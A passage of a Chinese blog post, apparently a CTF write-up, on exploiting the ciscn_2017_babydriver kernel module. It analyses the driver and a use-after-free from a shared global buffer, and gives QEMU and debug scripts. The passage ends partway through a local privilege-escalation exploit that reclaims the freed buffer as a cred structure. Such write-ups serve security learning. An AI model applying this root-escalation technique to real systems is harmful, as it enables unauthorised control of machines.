@@ -1,0 +1,518 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <meta name="description" content="开始之前最近在屁颠屁颠的学kernel pwn，跟着一些视频、博客搭建环境，学习调试内核。但感觉内核态的漏洞涉及了很多知识点，只能遇到啥去学啥了。 因此为了巩固每次新学习的知识点，我打算整理好记下来，同时录个视频加强自己的思维理解，当然如果能帮助到其他正在学习的小伙伴那就更好了。 驱动分析ida打开驱动一看，有如下几个功能函数，其中babydriver_init和babydriver_exit函数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ciscn_2017_babydriver的几种解法">
+<meta property="og:url" content="http://example.com/2021/11/26/ciscn-2017-babydriver%E7%9A%84%E5%87%A0%E7%A7%8D%E8%A7%A3%E6%B3%95/index.html">
+<meta property="og:site_name" content="verf1sh&#39;blog">
+<meta property="og:description" content="开始之前最近在屁颠屁颠的学kernel pwn，跟着一些视频、博客搭建环境，学习调试内核。但感觉内核态的漏洞涉及了很多知识点，只能遇到啥去学啥了。 因此为了巩固每次新学习的知识点，我打算整理好记下来，同时录个视频加强自己的思维理解，当然如果能帮助到其他正在学习的小伙伴那就更好了。 驱动分析ida打开驱动一看，有如下几个功能函数，其中babydriver_init和babydriver_exit函数">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/11/26/3PIvoTeEZi1DgOW.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/26/EheFxCutDqb61ym.png">
+<meta property="og:image" content="c:/Users/14273/AppData/Roaming/Typora/typora-user-images/image-20211126161458750.png">
+<meta property="og:image" content="c:/Users/14273/AppData/Roaming/Typora/typora-user-images/image-20211126161541874.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/26/E9bopLP2H13CWgw.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/26/4cIrTwA2u61NmaG.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/26/tDToXgYA4b8nWyG.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/26/nBNH15Ljvui4h9M.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/26/61duVwijf4W7ne8.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/26/VQCUvldZN5m4iTX.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/26/26bMHJBQlRP4txE.png">
+<meta property="article:published_time" content="2021-11-26T05:52:34.000Z">
+<meta property="article:modified_time" content="2021-11-29T07:56:08.351Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="kernel pwn">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i.loli.net/2021/11/26/3PIvoTeEZi1DgOW.png">
+  
+  <title>ciscn_2017_babydriver的几种解法 - verf1sh&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>verf1sh&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="ciscn_2017_babydriver的几种解法">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-11-26 13:52" pubdate>
+        2021年11月26日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      6.3k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      20 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">ciscn_2017_babydriver的几种解法</h1>
+            
+            <div class="markdown-body">
+              <h2 id="开始之前"><a href="#开始之前" class="headerlink" title="开始之前"></a>开始之前</h2><p>最近在屁颠屁颠的学kernel pwn，跟着一些视频、博客搭建环境，学习调试内核。但感觉内核态的漏洞涉及了很多知识点，只能遇到啥去学啥了。</p>
+<p>因此为了巩固每次新学习的知识点，我打算整理好记下来，同时录个视频加强自己的思维理解，当然如果能帮助到其他正在学习的小伙伴那就更好了。</p>
+<h2 id="驱动分析"><a href="#驱动分析" class="headerlink" title="驱动分析"></a>驱动分析</h2><p>ida打开驱动一看，有如下几个功能函数，其中<code>babydriver_init</code>和<code>babydriver_exit</code>函数是用于内核模块的初始化和退出。</p>
+<p><img src="https://i.loli.net/2021/11/26/3PIvoTeEZi1DgOW.png" srcset="/img/loading.gif" lazyload alt="image-20211126144216043"></p>
+<p>每个函数都过一遍，第一次看感觉好陌生，各种不认识的函数名，那不认识还能怎么办，一个一个查呗，多见几次就熟悉了。</p>
+<h3 id="babydriver-init"><a href="#babydriver-init" class="headerlink" title="babydriver_init"></a>babydriver_init</h3><p>首先是babydriver_init函数，反汇编如下</p>
+<p><img src="https://i.loli.net/2021/11/26/EheFxCutDqb61ym.png" srcset="/img/loading.gif" lazyload></p>
+<ol>
+<li><p>在这个init函数中，<code>alloc_chrdev_region</code>用于动态分配设备编号，在<code>fs/char_dev.c</code>中，成功调用这个函数后babydev_no就存放设备号了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * alloc_chrdev_region() - register a range of char device numbers</span><br><span class="hljs-comment"> * @dev: output parameter for first assigned number</span><br><span class="hljs-comment"> * @baseminor: first of the requested range of minor numbers</span><br><span class="hljs-comment"> * @count: the number of minor numbers required</span><br><span class="hljs-comment"> * @name: the name of the associated device or driver</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Allocates a range of char device numbers.  The major number will be</span><br><span class="hljs-comment"> * chosen dynamically, and returned (along with the first minor number)</span><br><span class="hljs-comment"> * in @dev.  Returns zero or a negative error code.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">alloc_chrdev_region</span><span class="hljs-params">(<span class="hljs-keyword">dev_t</span> *dev, <span class="hljs-keyword">unsigned</span> baseminor, <span class="hljs-keyword">unsigned</span> count,</span></span><br><span class="hljs-params"><span class="hljs-function">			<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">char_device_struct</span> *<span class="hljs-title">cd</span>;</span><br>	cd = __register_chrdev_region(<span class="hljs-number">0</span>, baseminor, count, name);<br>	<span class="hljs-keyword">if</span> (IS_ERR(cd))<br>		<span class="hljs-keyword">return</span> PTR_ERR(cd);<br>	*dev = MKDEV(cd-&gt;major, cd-&gt;baseminor);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li>
+<li><p><code>cdev_init</code>函数用与绑定cdev和file_oprations之前的连接，cdev结构体的定义如下，在源码的<code>include/linux/cdev.h</code>中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cdev</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kobject</span> <span class="hljs-title">kobj</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">module</span> *<span class="hljs-title">owner</span>;</span><br>	<span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> *<span class="hljs-title">ops</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><br>	<span class="hljs-keyword">dev_t</span> dev;<br>	<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> count;<br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure>
+
+<p><code>cdev_init</code>函数在<code>fs/char_dev.c</code>里面，其中file_oprations就是一个类似于虚表的东西，里面存了好多函数指针，<code>cdev-&gt;ops = fops</code>赋值之后这个字符设备就可以调用相关的函数了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * cdev_init() - initialize a cdev structure</span><br><span class="hljs-comment"> * @cdev: the structure to initialize</span><br><span class="hljs-comment"> * @fops: the file_operations for this device</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Initializes @cdev, remembering @fops, making it ready to add to the</span><br><span class="hljs-comment"> * system with cdev_add().</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">cdev_init</span><span class="hljs-params">(struct cdev *cdev, <span class="hljs-keyword">const</span> struct file_operations *fops)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-built_in">memset</span>(cdev, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> *cdev);<br>	INIT_LIST_HEAD(&amp;cdev-&gt;<span class="hljs-built_in">list</span>);<br>	kobject_init(&amp;cdev-&gt;kobj, &amp;ktype_cdev_default);<br>	cdev-&gt;ops = fops;<br>&#125;<br></code></pre></td></tr></table></figure></li>
+<li><p><code>cdev_add</code>函数同样在<code>fs/char_dev.c</code>里面，简单理解它就是完成了cdev和设备号之间的绑定</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">cdev_add</span><span class="hljs-params">(struct cdev *p, <span class="hljs-keyword">dev_t</span> dev, <span class="hljs-keyword">unsigned</span> count)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">int</span> error;<br><br>	p-&gt;dev = dev;<br>	p-&gt;count = count;<br><br>	error = kobj_map(cdev_map, dev, count, <span class="hljs-literal">NULL</span>,<br>			 exact_match, exact_lock, p);<br>	<span class="hljs-keyword">if</span> (error)<br>		<span class="hljs-keyword">return</span> error;<br><br>	kobject_get(p-&gt;kobj.parent);<br><br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>也就是说<code>cdev_init</code>建立了字符设备<code>cdev</code>和<code>file_operations</code>之间的联系，<code>cdev_add</code>建立字符设备<code>cdev</code>和设备号的联系，那么这两个函数调用完，从<code>cdev</code>到<code>file_operations</code>及到设备号的联系就建立起来了，所以在内核中有设备号就能找到<code>cdev</code>，有<code>cdev</code>就能找到<code>file_operations</code>。</p>
+</li>
+<li><p>_class_create创建一个设备节点，返回相应的class，再调用device_create注册这个设备节点。这两个函数都定义在头文件<code>include/linux/device.h</code>中。下面引用一段话</p>
+<blockquote>
+<p>我们在刚开始写Linux设备驱动程序的时候， 很多时候都是利用mknod命令手动创建设备节点，实际上Linux内核为我们提供了一组函数，可以用来在模块加载的时候自动在/dev目录下创建相应设 备节点，并在卸载模块时删除该节点，当然前提条件是用户空间移植了udev。</p>
+<p>内核中定义了struct class结构体，顾名思义，<strong>一个struct class结构体类型变量对应一个类</strong>， 内核同时提供了class_create(…)函数，可以用它来创建一个类，这个类存放于sysfs下面，一旦创建好了这个类，再调用 device_create(…)函数来在/dev目录下创建相应的设备节点。这样，加载模块的时候，用户空间中的udev会自动响应 device_create(…)函数，去/sysfs下寻找对应的类从而创建设备节点。</p>
+</blockquote>
+</li>
+</ol>
+<p>每个地方失败都会有回滚操作(destroy或者unregister)</p>
+<h3 id="babydriver-exit"><a href="#babydriver-exit" class="headerlink" title="babydriver_exit"></a>babydriver_exit</h3><p><code>exit</code>函数就跟<code>init</code>函数正好相反，你注册，我就卸载，看函数名字也能看出来它是设备卸载时候会调用的，会把分配的设备和class等回收</p>
+<p><img src="C:\Users\14273\AppData\Roaming\Typora\typora-user-images\image-20211126161458750.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="babyopen"><a href="#babyopen" class="headerlink" title="babyopen"></a>babyopen</h3><p>open函数的参数有<code>inode</code>和<code>filp</code>，每一个设备都会对应一个inode，而且是共享一个inode，这个不像filp文件指针每次打开一个设备都会创建一个新的文件指针以供操作(内核里的文件指针，跟用户态不一样)</p>
+<p><img src="C:\Users\14273\AppData\Roaming\Typora\typora-user-images\image-20211126161541874.png" srcset="/img/loading.gif" lazyload alt="image-20211126161541874"></p>
+<h3 id="babyread"><a href="#babyread" class="headerlink" title="babyread"></a>babyread</h3><p><code>read</code>函数是从内核往用户态读数据，kernel里的文件结构体定义了一组基础接口，允许开发者按照参数的标准实现一套自己的函数，<code>read write open release(close)</code>都是自己实现的，这里的read判断<code>babydev_struct.device_buf</code>不为NULL就将用户输入的第三个参数length长的数据从<code>device_buf</code>拷贝到<code>Buffer</code>里</p>
+<p><img src="https://i.loli.net/2021/11/26/E9bopLP2H13CWgw.png" srcset="/img/loading.gif" lazyload></p>
+<p>其实<code>babyread</code>和<code>babywrite</code>中实现了常规的<code>copy_from_user</code>和<code>copy_to_user</code>，限制了读取大小最多为<code>babydev_struct.device_buf_len</code>。</p>
+<h3 id="babyioctl"><a href="#babyioctl" class="headerlink" title="babyioctl"></a>babyioctl</h3><p>ioctl是最简单的和设备通信的方式，开发者可以在其中根据arg参数决定对设备不同的操作，在babyioctl中存在一个指令0x10001，这个指令可以重新制定堆块大小，将原有的内存释放，重新申请新的堆空间。</p>
+<p><img src="https://i.loli.net/2021/11/26/4cIrTwA2u61NmaG.png" srcset="/img/loading.gif" lazyload alt="image-20211126162058591"></p>
+<h3 id="babyrelease"><a href="#babyrelease" class="headerlink" title="babyrelease"></a>babyrelease</h3><p>release函数调用发生在关闭设备文件的时候，这里会free掉buf</p>
+<p><img src="https://i.loli.net/2021/11/26/tDToXgYA4b8nWyG.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这里的漏洞是因为在驱动中没有处理好并发，全局变量在两次打开设备文件的时候是共享的，当对同一文件打开多次时，<code>babydev_struct.device_buf</code>会被不断覆写，而在<code>babyrelease</code>时，会释放掉全部文件共享的缓冲区。而由于存在设置大小的函数，从而可以造成任意大小堆块的UAF漏洞。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h3><p>我们有了uaf漏洞，如果使某个进程的cred结构体被放进这个UAF的空间，然后通过write把uid覆写为0，就可以提权了，关于cred结构体可用<a target="_blank" rel="noopener" href="https://verf1sh.github.io/2021/10/22/linux_kernel_pwn%E5%88%9D%E6%8E%A2/#%E8%BF%9B%E7%A8%8B%E6%9D%83%E9%99%90%E5%87%AD%E8%AF%81">参考这里</a>。那么如何控制cred结构？我们首先通过ioctl改变大小，使得buf和cred结构大小一样，接下来只需要在触发UAF的时候新建一个cred结构，新建的cred结构就很有可能被放进这个UAF的空间里，新建进程的时候就会涉及cred结构体的申请，那么fork就解决了</p>
+<h4 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h4><p>查看一下驱动，只有NX保护打开了</p>
+<p><img src="https://i.loli.net/2021/11/26/nBNH15Ljvui4h9M.png" srcset="/img/loading.gif" lazyload alt="image-20211126163619638"></p>
+<p>打包脚本pack.sh</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><br>cp -r rootfs rootfs_tmp<br><span class="hljs-comment"># cp -r etc rootfs_tmp/</span><br>cp init rootfs_tmp/<br>cp babydriver.ko rootfs_tmp/<br><br>gcc -g -static exp.c -o exp<br>cp exp rootfs_tmp/<br><br>chmod +x rootfs_tmp/init<br>chmod g-w -R rootfs_tmp/<br>chmod o-w -R rootfs_tmp/<br>sudo chown -R root rootfs_tmp/<br>sudo chgrp -R root rootfs_tmp/<br>sudo chmod u+s rootfs_tmp/bin/busybox<br><br><span class="hljs-built_in">cd</span> rootfs_tmp/<br>find . | cpio -o -H newc &gt; ../rootfs.cpio<br><span class="hljs-built_in">cd</span> ..<br><br>sudo rm -rf rootfs_tmp/<br></code></pre></td></tr></table></figure>
+
+<p>qemu启动脚本start.sh</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br><br>qemu-system-x86_64 \<br>	-m 1024M \<br>	-cpu kvm64,+smep\<br>	-kernel ./babydriver/bzImage \<br>	-initrd ./babydriver/rootfs.cpio \<br>	-nographic \<br>	-monitor none \<br>	-append <span class="hljs-string">&quot;console=ttyS0 nokaslr quiet&quot;</span> \<br>	--enable-kvm -s<br></code></pre></td></tr></table></figure>
+
+<p>init启动脚本</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br> <br>mount -t proc none /proc<br>mount -t sysfs none /sys<br>mount -t devtmpfs devtmpfs /dev<br>chown root:root flag<br>chmod 400 flag<br><span class="hljs-built_in">exec</span> 0&lt;/dev/console<br><span class="hljs-built_in">exec</span> 1&gt;/dev/console<br><span class="hljs-built_in">exec</span> 2&gt;/dev/console<br><br>insmod /lib/modules/4.4.72/babydriver.ko<br>chmod 777 /dev/babydev<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\nBoot took <span class="hljs-subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span><br>setsid cttyhack setuidgid 1000 sh<br><br>umount /proc<br>umount /sys<br>poweroff -d 0  -f<br></code></pre></td></tr></table></figure>
+
+<p>gdb调试脚本</p>
+<p>vmlinux-to-elf工具可用从内核中提取到带符号的vmlinux</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">vmlinux-to-elf bzImage vmlinux<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><br>gdb -q \<br>	-ex <span class="hljs-string">&quot;file vmlinux&quot;</span>\<br>	-ex <span class="hljs-string">&quot;set architecture i386:x86-64&quot;</span>\<br>	-ex <span class="hljs-string">&quot;add-symbol-file babydriver.ko 0xffffffffc0000000&quot;</span>\<br>	-ex <span class="hljs-string">&quot;target remote localhost:1234&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>启动内核之后再运行gdb调试脚本，先下两个断点，再按c</p>
+<p><img src="https://i.loli.net/2021/11/26/61duVwijf4W7ne8.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后再运行exp</p>
+<p><img src="https://i.loli.net/2021/11/26/VQCUvldZN5m4iTX.png" srcset="/img/loading.gif" lazyload alt="image-20211126172539904"></p>
+<p>这样就可以断下来了，在kmalloc函数前停一下，注意他执行完的返回值rax为0xffff88003cce3f00</p>
+<p><img src="https://i.loli.net/2021/11/26/26bMHJBQlRP4txE.png" srcset="/img/loading.gif" lazyload alt="image-20211126173400995"></p>
+<p>然后按c，运行到babyrelease函数，在kfree那里停一下，观察rdi</p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stropts.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-comment">// 打开两次设备</span><br>	<span class="hljs-keyword">int</span> fd1 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br>	<span class="hljs-keyword">int</span> fd2 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br><br>	<span class="hljs-comment">// 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)</span><br>	ioctl(fd1, <span class="hljs-number">0x10001</span>, <span class="hljs-number">0xa8</span>);<br><br>	